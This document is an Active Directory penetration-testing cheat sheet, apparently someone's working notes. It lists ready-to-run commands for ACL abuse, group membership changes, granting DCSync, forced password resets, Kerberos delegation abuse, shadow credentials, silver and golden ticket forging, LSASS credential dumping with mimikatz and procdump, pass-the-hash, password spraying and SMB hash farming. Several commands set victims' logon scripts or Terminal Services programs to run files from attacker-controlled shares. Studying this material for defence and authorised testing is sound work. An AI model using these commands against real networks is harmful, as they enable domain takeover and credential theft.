# The next time they logon, the script will be executed
# Change script path
bloodyAD --host 10.0.0.5 -d $dom -u attacker -p $pass set object delegate scriptpath -v '\\10.0.0.5\totallyLegitScript.bat'
# Change script path
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.bat"

# Generic All / Owns - Computer (Read LAPS/GMSA Password, RBCD*, Shadow Credentials*)
# Shadow credential attack requires 2016 Domain Functional Level and ADCS
# RBCD requires Server 2012 Functional Level

# Generic All - Group (Add/Change Membership)
# Add yourself to group, Windows/Linux
bloodyAD --host $ip -d $dom -u $user -p $pass add groupMember 'Domain Admins' $user
# Add yourself to group, Windows
net group "domain admins" $user /add /domain
# Add yourself to group, Linux
net rpc group ADDMEM "GROUP NAME" UserToAdd -U $user%$pass -W $dom -I $dcip

# Generic Write - User (targeted kerberoast, reset password)
source /opt/targetedKerberoast/venv/bin/activate # Set SPN to user, then query and crack TGS-REP
python /opt/targetedKerberoast/targetedKerberoast.py -d $dom -u $user -p $pass --dc-ip $ip
python /opt/targetedKerberoast/targetedKerberoast.py -d $dom -u $user -p $pass --dc-ip $ip -o kerberload.txt
python /opt/windows/targetedKerberoast/targetedKerberoast.py -d $dom -u $user -p $pass --dc-ip $ip
net group "victim_group" myuser /add /domain
impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip "$dom"/"$user":"$pass"
Set-ADAccountPassword victim_user -Reset # Access additional services that requires password. May need to add Reset Password right. Consider obtaining old NT hash after
mimikatz "privilege::debug lsadump::changentlm /server:$dc /user:victim_user /old:NT /newpassword:Password123!" 
mimikatz "privilege::debug lsadump::setntlm /server:$dc /user:victim_user /password:Password123!"
python3 smbpasswd.py $dom/administrator@$dom -hashes :<ADMINISTRATOR NT HASH> -reset esteban_da -newhashes :<ESTEBAN_DA NT HASH>
SPN-Jacking.py # If the "listed SPN" already belongs to an object, it must be removed from it first. This would require the same privileges (GenericAll, GenericWrite, etc.) over the SPN owner as well (a.k.a. "Live SPN-jacking"). Else, the SPN can be simply be added to the target object (a.k.a. "Ghost SPN-jacking"). 

# Generic Write - Computer (RBCD, Shadow Credentials)
# Shadow credential attack requires 2016 Domain Functional Level and ADCS
# RBCD requires Server 2012 Functional Level

# Generic Write & Remote Connection Manager
# The RCM is only active on Terminal Servers/Remote Desktop Session Hosts. The RCM has also been disabled on recent version of Windows (>2016), it requires a registry change to re-enable.
# Set RCM Script, Linux/Windows
bloodyAD --host $ip -d $dom -u $user -p $pass set object vulnerable_user msTSInitialProgram -v '\\1.2.3.4\share\file.exe'
bloodyAD --host $ip -d $dom -u $user -p $pass set object vulnerable_user msTSWorkDirectory -v 'C:\'
# Set RCM Script, Windows
$UserObject = ([ADSI]("LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld"))
$UserObject.TerminalServicesInitialProgram = "\\1.2.3.4\share\file.exe"
$UserObject.TerminalServicesWorkDirectory = "C:\ "
$UserObject.SetInfo() 

# WriteDACL - Group (We can add and inherit GenericAll permission, then kerberoast or password reset)
# Get Generic All, Linux/Windows
bloodyAD --host $dc -d corp -u $user -p $pass add genericAll 'cn=INTERESTING_GROUP,dc=corp' $user
# Get Generic All, Linux
dacledit.py -k -no-pass $dom/$user -dc-ip dc.$dom -principal $user -target "Network Audit" -action write -rights FullControl
# Get Generic All, Windows
net group "INTERESTING_GROUP" User1 /add /domain # Using native command
PowerSploit> Add-DomainObjectAcl -TargetIdentity "INTERESTING_GROUP" -Rights WriteMembers -PrincipalIdentity User1 # Or with external tool

# WriteDACL - Domain
# Give DC Sync right, Linux/Windows
bloodyAD.py --host $ip -d $dom -u $user -p :$hash add dcsync user2 # Give DCSync right to the principal identity
bloodyAD.py --host $dcip -d $dom -u attacker_user -p Password123! add dcsync user2 
bloodyAD.py --host $dcip -d $dom -u attacker_user -p :$hash remove dcsync user2 # Remove right after DCSync
# Give DC Sync right, Linux/Windows
Import-Module .\PowerView.ps1 
$SecPassword = ConvertTo-SecureString 'user1pwd' -AsPlainText -Force # Give DCSync right to the principal identity
$Cred = New-Object System.Management.Automation.PSCredential('$dom\user1', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=domain,DC=local' -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain $dom

# WriteDACL (Non-Privileged) - OU 
# Add full control ACE to OU and specify that the ACE should be inherited
# ACE inheritance from parent objects is disabled for adminCount=1
# Prereqs: GenericAll||WriteOwner, TargetUser(s) adminCount!=1
dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal $user -target-dn 'OU=SERVERS,DC=lab,DC=local' 'lab.local'/$user:'Password1' # Grant Full Control on SERVERS OU 
dacledit.py -action 'read' -principal $user -target-dn 'CN=AD01-SRV1,OU=SERVERS,DC=lab,DC=local' 'lab.local'/$user:'Password1' # Verify

# WriteDACL (Privileged) - OU
# gPLink -> Attacker GPC FQDN -> GPT configuration files in Attacker SMB share -> execute a malicious scheduled task
# Edit the gPLink value to include a GPC FQDN pointing the attacker machine, Create a fake LDAP server mimicking the real one, but with a custom GPC, GPC's gPCFileSysPath value is pointing to the attacker SMB share, The SMB share is serving GPT configuration files including a malicious scheduled task
# Prereqs: GenericWrite||GenericAll||Manage Group Policy, can create machine account, can add new DNS records
# Refer to this article for setup, "https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory"
sudo python3 OUned.py --config config.ini
sudo python3 OUned.py --config config.example.ini --just-coerce

# WriteOwner to Owner *Does Owner automatically inherit GenericAll?*
# An attacker can update the owner of the target object. Once the object owner has been changed to a principal the attacker controls, the attacker may manipulate the object any way they wants. 
# Out: This ACE can be abused for an Immediate Scheduled Task attack, or for adding a user to the local admin group.
# Set owner, Linux/Windows
bloodyAD --host $dc -d corp -u $user -p $pass set owner target_object $user
# Set owner, Linux
owneredit.py -new-owner "$user" -target "NETWORK AUDIT" -dc-ip $ip -action write "$dom"/"$user":"$pass" -k
# Set owner, Windows
Powerview> Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity 'controlled_principal'

# AllExtendedRights - User (Force password reset)
Set-ADAccountPassword victim_user -Reset # Access additional services that requires password. May need to add Reset Password right. Consider obtaining old NT hash after
mimikatz "privilege::debug lsadump::changentlm /server:$dc /user:victim_user /old:NT /newpassword:Password123!" 
mimikatz "privilege::debug lsadump::setntlm /server:$dc /user:victim_user /password:Password123!"
python3 smbpasswd.py $dom/administrator@$dom -hashes :<ADMINISTRATOR NT HASH> -reset esteban_da -newhashes :$hash

# ReadLAPSPassword
# An attacker can read the LAPS password of the computer account this ACE applies to.
# ReadLAPSPassword, Linux/Windows
bloodyAD -u $user -d bloody.lab -p $pass --host $ip get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
# ReadLAPSPassword, Linux
nxc smb $ip auth_method -M laps
# ReadLAPSPassword, Windows
Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'

# ReadGMSAPassword
# An attacker can read the GMSA password of the account this ACE applies to.
# ReadGMSAPassword, Linux/Windows
bloodyAD -u $user -d bloody -p $pass --host $ip get object 'gmsaAccount$' --attr msDS-ManagedPassword
# ReadGMSAPassword, Linux
nxc smb $ip auth_method --gmsa
# ReadGMSAPassword, Windows
$gmsa = Get-ADServiceAccount -Identity 'SQL_HQ_Primary' -Properties 'msDS-ManagedPassword' # Save the blob to a variable
$mp = $gmsa.'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $mp # Decode the data structure using the DSInternals module

# ForceChangePassword
# An attacker can change the password of the user this ACE applies to.
# ForceChangePassword Linux/Windows
bloodyAD --host $dcip -d $dom -u attacker_user -p :$hash set password target_user target_newpwd
bloodyAD --host $dcip -d $dom -u attacker_user -p $pass set password target_user target_newpwd
# ForceChangePassword Linux
rpcclient -U '$user%$pass' -W $dom -c "setuserinfo2 $target 23 'Password123\!'" $ip
# ForceChangePassword Windows
$NewPassword = ConvertTo-SecureString $pass -AsPlainText -Force
Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword

# Generic Write - GPO (Edit GPO)

# Generic Write - Group (Add/Change Membership)

# AllExtendedRights - Computer (Read LAPS/GMSA Password)

# AllExtendedRights - Group (Add Member)

# AllExtendedRights - Domain (DCSync)

# AddKeyCredentialLink (Shadow credential attack)
python pywhisker.py -d $dom -u $user -k -t "winrm_user" --action "add"  --dc-ip $ip # -no-pass
python pywhisker.py -d "$dom" -u "n00py" -p "PasswordForn00py" --target "esteban_da" --action "add" --filename hax
python gettgtpkinit.py -cert-pfx hax.pfx -pfx-pass dfeiecA9SZN75zJ7P5Zs $dom/esteban_da esteban_da.ccache
python getnthash.py -key 571d3d9f833365b54bd311a906a63d95da107a8e7457e8ef01b36810daadf243 $dom/esteban_da
.\Whisker.exe add /target:victim_user /domain:$dom # Then run Rubeus asktgt command that's output

# WriteProperty over WriteSPN
SPN-Jacking.py # If the "listed SPN" already belongs to an object, it must be removed from it first. This would require the same privileges (GenericAll, GenericWrite, etc.) over the SPN owner as well (a.k.a. "Live SPN-jacking"). Else, the SPN can be simply be added to the target object (a.k.a. "Ghost SPN-jacking").

# Constrained Delegation (msds-allowedtodelegatetoeTo)
# Essentially, if a computer/user object has a userAccountControl value containing TRUSTED_TO_AUTH_FOR_DELEGATION then anyone who compromises that account can impersonate any user to the SPNs set in msds-allowedtodelegateto.
# Prereqs: SeEnableDelegationPrivilege to modify parameters, uac value TRUSTED_TO_AUTH_FOR_DELEGATION, compromise account, forwardable flag set on TGS-REQ
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname,description # Discovery
Import-Module .\powerview.ps1
Get-NetComputer -Unconstrained
Get-DomainUser SQLService -Properties distinguishedname,msds-allowedtodelegateto,useraccountcontrol | fl
Get-DomainUser SQLService -Properties distinguishedname,msds-allowedtodelegateto,useraccountcontrol | ConvertFrom-UACValue
rubeus.exe monitor /monitorinterval:10 /targetuser:dc1$ /nowrap # Will dump TGT of any user that authenticates to DC1
# S4U2self 
# Allows a service to request a special forwardable service ticket to itself on behalf of a particular user.
# Prereqs: user has TRUSTED_TO_AUTH_FOR_DELEGATION
# Out: Forwardable TGS that can be used for S4U2proxy as user
# S4U2proxy
# Allows the caller, the service account in our case, to use this forwardable ticket to request a service ticket to any SPN specified in msds-allowedtodelegateto, impersonating the user specified in the S4U2self step
# Prereqs: SPN attribute msds-allowedtodelegateto
# Out: TGS, Elevated access of that service
Get-DomainComputer -TrustedtoAuth -Properties distinguishedname,msds-allowedtodelegateto,useraccountcontrol # Discovery, enumerate all computers and users with a non-null msds-allowedtodelegateto field set
Get-DomainUser -TrustedtoAuth -Properties distinguishedname,msds-allowedtodelegateto,useraccountcontrol
# S4U2Self Scenario
# Prereqs: Compromised User Account, Password of User Account, User has TRUSTED_TO_AUTH_FOR_DELEGATION
Import-Module .\powerview.ps1
Get-DomainUser SQLService -Properties distinguishedname,msds-allowedtodelegateto,useraccountcontrol | fl
# Kekeo
asktgt.exe /user:SQLService /domain:testlab.local /password:Password123! /ticket:sqlservice.kirbi # Kekeo, Requesting a TGT for the user account with constrained delegation enabled
s4u.exe /tgt:sqlservice.kirbi /user:Administrator@testlab.local /service:cifs/PRIMARY.testlab.local # Using s4u.exe to execute S4U2Proxy
mimikatz "kerberos::ptt cifs.PRIMARY.testlab.local.kirbi" # Inject
# S4U2Self Scenario
# Prereqs: Compromised computer, computer account has TRUSTED_TO_AUTH_FOR_DELEGATION, Target user has SeTcbPrivilege (default)
Import-Module .\powerview.ps1
Get-DomainComputer $compromised_computer -Properties SamAccountName,msds-allowedtodelegateto | fl
$Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityMode1')
$Ident = New-Object System.Security.Principal.WindowsIdentity @('Administrator@TESTLAB.LOCAL')
$Context = $Ident.Impersonate()
ls \\PRIMARY.TESTLAB.LOCAL\C$ # Verify
# S4U2Self Scenario
# Prereqs: Compromised User Account, NTLM of User Account, User has TRUSTED_TO_AUTH_FOR_DELEGATION
asktgt.exe /user:SQLService /domain:testlab.local /key:$ntlm /ticket:sqlservice.kirbi # Kekeo, Requesting a TGT for the user account with constrained delegation enabled
s4u.exe /tgt:sqlservice.kirbi /user:Administrator@testlab.local /service:cifs/PRIMARY.testlab.local # Using s4u.exe to execute S4U2Proxy
mimikatz "kerberos::ptt cifs.PRIMARY.testlab.local.kirbi" # Inject
# S4U2Self Scenario
# Prereqs: Computer account hash, computer account has TRUSTED_TO_AUTH_FOR_DELEGATION, Target user has SeTcbPrivilege (default)
asktgt.exe /user:WINDOWS1$ /domain:testlab.local /key:$ntlm /ticket:sqlservice.kirbi # Kekeo, Requesting a TGT for the computer account with constrained delegation enabled
s4u.exe /tgt:sqlservice.kirbi /user:Administrator@testlab.local /service:cifs/PRIMARY.testlab.local # Using s4u.exe to execute S4U2Proxy
mimikatz "kerberos::ptt cifs.PRIMARY.testlab.local.kirbi" # Inject

--- 

# Resource Based Constrained Delegation
# Generalized DACL-based computer takeover, Constratined delegation but TGS not forwardable
# Prereqs: Compromised SPN||MachineAccountQuota, Writable msDS-AllowedToActOnBehalfOfOtherIdentity for Computer Account (typically GenericAll, GenericWrite, WriteOwner,..), At least one 2012+ domain controller
# Out: Pwn, Compromised Computer Account
Import-Module .\powermad.ps1
Import-Module .\powerview.ps1
$TargetComputer = "primary.testlab.local"
$AttackerSID = Get-DomainUser attacker -Properties objectsid | Select -Expand objectsid
$ACE = GetDomainObjectACL $TargetComputer | ?{$_.SecurityIdentifier -match $AttackerSID} # Verify write permissions
$ACE
$ConvertFrom-SID $ACE.SecurityIdentifier
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString $pass -AsPlainText -Force) # Create new machine account
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))" # build the new raw security descriptor with this computer account as the principal
$SDBytes = New-Object byte[] ($SD.BinaryLength) # get the binary bytes for the SDDL
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} # set new security descriptor for 'msds-allowedtoactonbehalfofotheridentity'
$RawBytes = Get-DomainComputer $TargetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity # confirming the security descriptor add
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
$Descriptor.DiscretionaryAcl
.\Rubeus.exe hash /password:Password123! /user:attackersystem /domain:testlab.local # Get password hash
.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:harmj0y /msdsspn:cifs/primary.testlab.local /ptt # # execute Rubeus' s4u process, impersonating "harmj0y" (a DA) to the cifs sname for the target computer (primary)

--- 

# Unconstrained Delegation
# Prereqs: machine's userAccountControl attribute contains ADS_UF_TRUSTED_FOR_DELEGATION
Get-DomainComputer -Unconstrained -Properties distinguishedname,useraccountcontrol -verbose | ft -a
# LDAP filter of '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
rubeus.exe monitor /interval:1 /filtuser:reddc$ /nowrap
Spoolsample.exe reddc redsqlw
rubeus.exe ptt /ticket:[ticket]
mimikatz # lsadump::dcsync /domain:red.com /user:RED\administrator

# SPN Jacking
# Prereqs: So pwn KCD, WriteSPN||GenericWrite||GenericAll Privs on ServerB SPN (if live jacking needed), WriteSPN||GenericWrite||GenericAll over ServerC (target) 
# Out: Pass the Cache / Pass the Ticket
findDelegation.py -user 'serverA$' "$DOMAIN"/"$USER":"$PASSWORD" # 1. show SPNs listed in the KCD configuration
addspn.py --clear -t 'ServerB$' -u "$DOMAIN"/"$USER" -p "$PASSWORD" 'DomainController.$dom' # 2. remove SPN from ServerB if required (live SPN-jacking)
addspn.py -t 'ServerC$' --spn "cifs/serverB" -u "$DOMAIN"/"$USER" -p "$PASSWORD" -c 'DomainController.$dom' # 3. add SPN to serverC
getST -spn "cifs/serverB" -impersonate "administrator" 'domain/serverA$:$PASSWORD' # 4. request an impersonating service ticket for the SPN through S4U2self + S4U2proxy
tgssub.py -in serverB.ccache -out newticket.ccache -altservice "cifs/serverC" # 5. Edit the ticket's SPN (service class and/or hostname)

# Pre-Auth Bruteforce
# Prereqs: LDAP queries
# Out: Valid Creds
smartbrute.py brute -bU $USER_LIST -bP $PASSWORD_LIST kerberos -d $DOMAIN # brute mode, users and passwords lists supplied
smartbrute.py smart -bP $PASSWORD_LIST ntlm -d $DOMAIN -u $USER -p $PASSWORD kerberos # smart mode, valid credentials supplied for enumeration
/opt/kerbrute userenum usernames.txt -d "$dom" --dc $ip
/opt/kerbrute userenum -d $dom --dc $ip /opt/SecLists/Usernames/xato-net-10-million-usernames-dup-lowercase.txt -t 100
/opt/kerbrute userenum -d $dom --dc $ip /opt/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt -t 100
/opt/kerbrute userenum -d $dom --dc $ip custom-wordlist.txt -t 100
cewl -g --with-numbers -d 20 $url |grep -v CeWL > custom-wordlist.txt
hashcat --stdout -a 0 -r /usr/share/hashcat/rules/best64.rule custom-wordlist.txt >> custom-passwords.txt
awk 'NR==FNR {a[$1]; next} {for (i in a) print $1 ":" i}' custom-passwords.txt users.txt > combined.txt
/opt/kerbrute bruteuser -d $dom custom-passwords.txt administrator --dc $ip
for i in $(cat users.txt); do echo "$i:$i" >> combo.txt; done
/opt/kerbrute bruteforce combo.txt -d $dom --dc $ip
/opt/kerbrute passwordspray -d $dom --dc $ip users.txt $pass

---

# Silver Ticket
# Prereqs: GetDomainSID, NT||AES of SPN, if the username supplied doesn't exist in Active Directory, the ticket gets rejected.
python ticketer.py -nthash "$NT_HASH" -domain-sid "$DomainSID" -domain "$DOMAIN" -spn "$SPN" "username" # NT
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$serviceAccount_NThash /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt # NT
python ticketer.py -aesKey "$AESkey" -domain-sid "$DomainSID" -domain "$DOMAIN" -spn "$SPN" "username" # AES
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$serviceAccount_aes128_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt # AES 128
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$serviceAccount_aes256_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt # AES 256

---

# Golden Ticket
# Prereqs: DomainAdmin, GetDomainSID, KRBTGT's NT
ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" "randomuser"
ticketer.py -aesKey "$krbtgtAESkey" -domain-sid "$domainSID" -domain "$DOMAIN" "randomuser"
ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" -user-id "$USERID" -groups "$GROUPID1,$GROUPID2,..." "randomuser" # custom user/group ids
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:randomuser /ptt # with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:randomuser /ptt # with an AES 128 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:randomuser /ptt # with an AES 256 key

---

# GetDomainSID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

---

# Local Admin - Dump Credentials from AD Domain (pth, crack passwords, ptt, create tickets, abuse certificates, opth)
ntdsutil
$key = Get-BootKey -SystemHiveFilePath 'C:\SYSTEM' ; $key ; Get-ADDBAccount -BootKey $key -DatabasePath 'C:\ntdsutil\Active Directory\ntds.dit' -SamAccountName victim_user
secretsdump.py '$dom/$user:<pass>'@$ip
gui.windows # Task Manager -> Details -> right click lsass.exe -> create dump file (stored in user's AppData\Local\Temp directory)
procdump.exe -accepteula -ma lsass.exe out.dmp
get-process lsass
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [PID] C:\temp\out.dmp full
tasklist | findstr lsass
procdump.exe -accepteula -ma 580 out.dmp
procdump.exe -accepteula -ma “lsass.exe” out.dmp
sekurlsa::minidump lsass.DMP
log lsass.txt
sekurlsa::logonPasswords
pypykatz lsa minidump lsass.DMP 
nxc smb 192.168.0.76 -u testadmin -p Password123 -M lsassy
lsassy -d test.lab -u testadmin -p Password123 192.168.0.76
/usr/share/$user/kirbi2john.py <KRB5_TGS kirbi>  > <Output file name> # If any TGS are dumped
john --wordlist=/usr/share/wordlists/rockyou.txt TGS_hash
# DLL for persistance, check keys

---

# Using BloodHound
# SharpHound.exe, Windows
.\SharpHound.exe -c all -d active.htb --searchforest
.\SharpHound.exe -c all,GPOLocalGroup # all collection doesn't include GPOLocalGroup by default
.\SharpHound.exe --CollectionMethod DCOnly # only collect from the DC, doesn't query the computers (more stealthy)
.\SharpHound.exe -c all --LdapUsername $user --LdapPassword <Password> --JSONFolder <PathToFile>
.\SharpHound.exe -c all --LdapUsername $user --LdapPassword <Password> --domaincontroller 10.10.10.100 -d active.htb
.\SharpHound.exe -c All,GPOLocalGroup --outputdirectory C:\Windows\Temp --prettyprint --randomfilenames --collectallproperties --throttle 10000 --jitter 23  --outputprefix internalallthething
# SharpHound.ps1, Windows
Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
Invoke-BloodHound -CollectionMethod All  -LDAPUser $user -LDAPPass <Password> -OutputDirectory <PathToFile>
# Collect Certificates Data
certipy find 'corp.local/$user:Passw0rd@dc.corp.local' -bloodhound
certipy find 'corp.local/$user:Passw0rd@dc.corp.local' -old-bloodhound
certipy find 'corp.local/$user:Passw0rd@dc.corp.local' -vulnerable -hide-admins -username user@domain -password Password123
# RustHound, Windows with Kerberos session (GSSAPI)
rusthound.exe -d $dom --ldapfqdn domain
# RustHound, Windows Bind
rusthound.exe -d $dom -u user@$dom -p Password123 -o output -z
# RustHound, Linux
rusthound -d $dom -u 'user@$dom' -p 'Password123' -o /tmp/adcs --adcs -z
# SOAPHound, Windows (Uses ADWS, not LDAP)
--buildcache: Only build cache and not perform further actions
--bhdump: Dump BloodHound data
--certdump: Dump AD Certificate Services (ADCS) data
--dnsdump: Dump AD Integrated DNS data
SOAPHound.exe --buildcache -c c:\temp\cache.txt
SOAPHound.exe -c c:\temp\cache.txt --bhdump -o c:\temp\bloodhound-output
SOAPHound.exe -c c:\temp\cache.txt --bhdump -o c:\temp\bloodhound-output --autosplit --threshold 1000
SOAPHound.exe -c c:\temp\cache.txt --certdump -o c:\temp\bloodhound-output
SOAPHound.exe --dnsdump -o c:\temp\dns-output
# BloodHound.py, Linux
bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all
bloodhound-python -u $user -p $pass -k -d $dom -dc $dc -c All,LoggedOn -ns $ip --zip # echo -n $pass | 	kinit $user@$realm
# ADExplorerSnapshot.py, Linux (Legitimate SysInternals tool to avoid detection)
ADExplorerSnapshot.py <snapshot path> -o <*.json output folder path>
# Starting BloodHound
root@payload$ apt install bloodhound 
# start BloodHound and the database
root@payload$ neo4j console
# or use docker
root@payload$ docker run -itd -p 7687:7687 -p 7474:7474 --env NEO4J_AUTH=neo4j/bloodhound -v $(pwd)/neo4j:/data neo4j:4.4-community
root@payload$ ./bloodhound --no-sandbox
Go to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:neo4j
# BloodHound CE
git clone https://github.com/SpecterOps/BloodHound
cd examples/docker-compose/
cat docker-compose.yml | docker compose -f - up
firefox http://localhost:8080/ui/login # Username: admin, Password: see your Docker logs
# Custom Queries
# https://github.com/ThePorgs/Exegol-images/blob/main/sources/assets/

---

# MimiKatz
.\mimikatz.exe
token::elevate # Makes sure commands are run as system
token::elevate /domainadmin
privilege::debug # Test if ^ is the case
log
sekurlsa::logonpasswords # Who has been on the host machine?
kerberos::list /export
kerberos::ptt ticket.kirbi # whoami will return your name pre-ptt, must test by access or executing something you couldn't before
lsadump::lsa /inject
sadump::lsa /inject /name:krbtgt
kerberos::tgt
sekurlsa::msv
sekurlsa::ekeys
lsadump::sam
lsadump::secrets
lsadump::cache
# FIND DLLS WITH PROCMON

---

Invoke-adPEAS -Domain 'access.offsec' -Server 'dc.access.offsec' -Username 'access\svc_mssql' -Password 'trustno1' -Force
Invoke-ADEnum -AllEnum -Force
.\pingcastle.exe --healthcheck --user access\svc_mssql --password trustno1 --level Full

.\Seatbelt.exe -group=all

# Impersonation
- LDAP allows for DCSync
- CIFS full file access
- HOST allows complete takeover
- MSSQL allows code execution as user
```

## One and Done (Boolean)

Can have a boolean flag for each to see if completed.

```bash
# Petite Potam
nxc smb $ip -u $user -p $pass -M petitpotam # Check
nxc smb $ip -u $user -p $pass -M petitpotam

# CVE-2020-1472 ZeroLogon
```

"https://www.thehacker.recipes/ad/movement/"

## Windows

```bash
# Pass the hash
mimikatz "privilege::debug lsadump::changentlm /server:$dc /user:victim_user /old:NT /newpassword:Password123!" # Access additional services that require password
mimikatz "privilege::debug lsadump::setntlm /server:$dc /user:victim_user /password:Password123!" # Write privs over object
mimikatz "privilege::debug sekurlsa::pth /user:$user /domain:$dom /ntlm:$hash"
xfreerdp /u:$user /d:$dom /pth:$hash /v:$ip
Invoke-WMIExec -Target $ip -Domain ignite -Username Administrator -Hash 32196B56FFE6F45E294117B91A83BF38 -Command "cmd /c mkdir c:\hacked" -Verbose
wmiexec.exe -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 $dom/Administrator@$ip
Rubeus.exe asktgt /domain:igntie.local /user:Administrator /rc4: 32196b56ffe6f45e294117b91a83bf38 /ptt

# Overpass the Hash / Pass the Key (PTK)
Rubeus ptt /ticket:<ticket>
Rubeus asktgt /user:victim /rc4:<rc4value>
Rubeus createnetonly /program:C:\Windows\System32\[cmd.exe||upnpcont.exe]
Rubeus ptt /luid:0xdeadbeef /ticket:<ticket>

# Pass the Ticket
kerberos::ptc Administrator.ccache
misc::cmd

# Export Ticket
sekurlsa::tickets /export
rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# Import Ticket
kerberos::ptt ticket.kirbi
rubeus.exe /ptt /ticket: [doIF…]

# Quick PE
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" "exit"
mimikatz sekurlsa::tickets /export

# Get Applocker Info
Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe

# Dump Credentials
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"

# SMB WRITE Permission on Windows
# Write SCF and URL files on a writeable share to farm for user's hashes and eventually replay them.

# Farmer to receive auth
farmer.exe <port> [seconds] [output]
farmer.exe 8888 0 c:\windows\temp\test.tmp # undefinitely
farmer.exe 8888 60 # one minute

# Crop can be used to create various file types that will trigger SMB/WebDAV connections for poisoning file shares during hash collection attacks
crop.exe <output folder> <output filename> <WebDAV server> <LNK value> [options]
Crop.exe \\\\fileserver\\common mdsec.url \\\\workstation@8888\\mdsec.ico
Crop.exe \\\\fileserver\\common mdsec.library-ms \\\\workstation@8888\\mdsec
```